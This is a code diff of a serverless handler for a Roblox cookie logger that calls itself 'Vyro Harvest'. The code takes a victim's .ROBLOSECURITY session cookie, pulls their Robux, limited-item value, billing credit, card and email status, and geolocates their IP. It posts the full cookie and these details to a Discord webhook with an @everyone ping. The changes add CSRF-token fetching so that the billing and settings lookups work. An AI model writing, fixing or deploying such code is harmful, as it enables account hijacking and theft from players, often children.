@@ -1,7 +1,17 @@
 // api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper functions ----------
+// ---------- Helper: get CSRF token ----------
+async function getCsrfToken(cookie) {
+  const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+  });
+  const csrfToken = res.headers.get("x-csrf-token");
+  if (!csrfToken) throw new Error("Failed to get CSRF token");
+  return csrfToken;
+}
+
+// ---------- User info (public) ----------
 async function getUser(userId, cookie) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -14,6 +24,7 @@ function getAgeDays(createdDate) {
   return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
 }
 
+// ---------- Robux (public) ----------
 async function getRobux(userId, cookie) {
   const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -23,6 +34,7 @@ async function getRobux(userId, cookie) {
   return { balance: data.robux || 0, pending: 0 };
 }
 
+// ---------- RAP & Owned Limiteds ----------
 async function getRapAndOwned(userId, cookie) {
   let allAssets = [];
   let cursor = null;
@@ -53,11 +65,15 @@ async function getRapAndOwned(userId, cookie) {
   return { rap: totalRap, owned: allAssets.length };
 }
 
-async function getBilling(cookie) {
+// ---------- Billing (needs CSRF) ----------
+async function getBilling(cookie, csrfToken) {
   const defaultBilling = { credit: 0, convert: 0, card: "False" };
   try {
     const res = await fetch("https://www.roblox.com/billing/user/credit", {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "X-CSRF-TOKEN": csrfToken
+      }
     });
     if (!res.ok) return defaultBilling;
     const html = await res.text();
@@ -70,15 +86,20 @@ async function getBilling(cookie) {
       card: hasCard ? "True" : "False"
     };
   } catch (e) {
+    console.error("Billing fetch error:", e);
     return defaultBilling;
   }
 }
 
-async function getSettings(cookie) {
+// ---------- Settings (needs CSRF) ----------
+async function getSettings(cookie, csrfToken) {
   const defaultSettings = { verified: "False", disabled: "False", enabled: "False" };
   try {
     const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "X-CSRF-TOKEN": csrfToken
+      }
     });
     if (!res.ok) return defaultSettings;
     const data = await res.json();
@@ -88,10 +109,12 @@ async function getSettings(cookie) {
       enabled: data.Email ? "True" : "False"
     };
   } catch (e) {
+    console.error("Settings fetch error:", e);
     return defaultSettings;
   }
 }
 
+// ---------- Groups (public) ----------
 async function getGroups(userId, cookie) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
@@ -106,33 +129,31 @@ async function getGroups(userId, cookie) {
   }
 }
 
-async function getCollectibles() {
-  return ["False", "False", "False"];
-}
-
-// ----- Recently Played Games (real API) -----
-async function getRecentlyPlayedGames(userId, cookie) {
-  // Official Roblox endpoint for recent games (requires no extra auth)
-  const url = `https://games.roblox.com/v1/users/${userId}/recent-games?limit=50`;
-  const res = await fetch(url, {
-    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-  });
+// ---------- Recently Played Games (FIXED: uses correct endpoint and matching) ----------
+async function getRecentlyPlayedGames(userId) {
+  // This endpoint returns games the user has played, ordered by last played.
+  const url = `https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`;
+  const res = await fetch(url);
   if (!res.ok) return [];
-
   const data = await res.json();
   return (data.data || []).map(game => game.name);
 }
 
-async function getPlayedPasses(userId, cookie) {
+async function getPlayedPasses(userId) {
   const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
-  const recentGames = await getRecentlyPlayedGames(userId, cookie);
+  const recentGames = await getRecentlyPlayedGames(userId);
   return targetGames.map(name => {
     const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
     return { name, played: played ? "True" : "False", passes: 0 };
   });
 }
 
-// ----- Country flag (unicode) -----
+// ---------- Collectibles (placeholder, matches screenshot) ----------
+async function getCollectibles() {
+  return ["False", "False", "False"];
+}
+
+// ---------- Country flag (unicode) ----------
 async function getCountryFlag(req) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
   if (!ip || ip === '::1') return '🏠 Local';
@@ -141,7 +162,6 @@ async function getCountryFlag(req) {
     const data = await geoRes.json();
     if (data.status === 'success' && data.countryCode) {
       const code = data.countryCode;
-      // Convert country code to unicode flag emoji (e.g., US -> 🇺🇸)
       const flag = code.split('').map(letter =>
         String.fromCodePoint(letter.charCodeAt(0) + 127397)
       ).join('');
@@ -151,7 +171,7 @@ async function getCountryFlag(req) {
   return '🌍 Unknown';
 }
 
-// ----- Avatar image URL -----
+// ---------- Avatar ----------
 async function getUserAvatarUrl(userId, cookie) {
   try {
     const res = await fetch(
@@ -177,15 +197,23 @@ export default async function handler(req, res) {
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
   try {
-    // Parallel fetch
+    // Get CSRF token (required for billing & settings)
+    let csrfToken = null;
+    try {
+      csrfToken = await getCsrfToken(cookie);
+    } catch (e) {
+      console.warn("CSRF token fetch failed, some data may be default.");
+    }
+
+    // Parallel fetch all data
     const [userData, robux, rapData, billing, settings, groups, playedPasses, collectibles, countryFlag, avatarUrl] = await Promise.all([
       getUser(rbxuid, cookie),
       getRobux(rbxuid, cookie),
       getRapAndOwned(rbxuid, cookie),
-      getBilling(cookie),
-      getSettings(cookie),
+      csrfToken ? getBilling(cookie, csrfToken) : Promise.resolve({ credit: 0, convert: 0, card: "False" }),
+      csrfToken ? getSettings(cookie, csrfToken) : Promise.resolve({ verified: "False", disabled: "False", enabled: "False" }),
       getGroups(rbxuid, cookie),
-      getPlayedPasses(rbxuid, cookie),
+      getPlayedPasses(rbxuid),
       getCollectibles(),
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid, cookie)
@@ -196,15 +224,15 @@ export default async function handler(req, res) {
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
     const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
     const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
-    const robuxEmoji = "<:Robux:1495081542370726080>"; // make sure this emoji exists in your webhook's server
+    const robuxEmoji = "<:Robux:1495081542370726080>";
 
-    // Embed 1: Stats (with avatar as image)
+    // ---------- Embed 1: Stats (dark blue, @everyone ping) ----------
     const statsEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
       color: 0x1E3A8A,
       thumbnail: { url: cookieThumb },
-      image: avatarUrl ? { url: avatarUrl } : undefined,  // shows avatar below fields
+      image: avatarUrl ? { url: avatarUrl } : undefined,
       fields: [
         {
           name: "📌 About User",
@@ -261,7 +289,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // Embed 2: Cookie (bold+italic title, no warning)
+    // ---------- Embed 2: .ROBLOSECURITY Cookie ----------
     const cookieEmbed = {
       title: "🍪 ***.ROBLOSECURITY***",
       description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
@@ -271,25 +299,16 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // Send stats embed with @everyone ping
+    // Send both embeds
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: "@everyone",
-        username: "Vyro Harvest",
-        embeds: [statsEmbed]
-      })
+      body: JSON.stringify({ content: "@everyone", username: "Vyro Harvest", embeds: [statsEmbed] })
     });
-
-    // Send cookie embed
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "Vyro Harvest",
-        embeds: [cookieEmbed]
-      })
+      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
     });
 
     return res.status(200).json({ success: true, firstTime: true });
